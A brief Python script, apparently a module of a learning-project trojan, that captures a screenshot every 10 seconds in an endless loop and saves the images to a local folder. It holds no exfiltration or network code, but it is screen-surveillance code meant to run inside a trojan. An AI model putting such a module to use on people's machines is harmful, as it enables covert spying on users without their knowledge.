import pyautogui  #take scrin 
import time
from datetime import datetime
import os

SCREENDIR = "/home/roman/VS/bhptrojan/modules/scrindir"
interval = 10

def run(**args):
    while True:
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        file_name = os.path.join(SCREENDIR, f"screenshot_{timestamp}.png")
        pyautogui.screenshot(file_name)
        time.sleep(interval)

if __name__ == "__main__":
    run()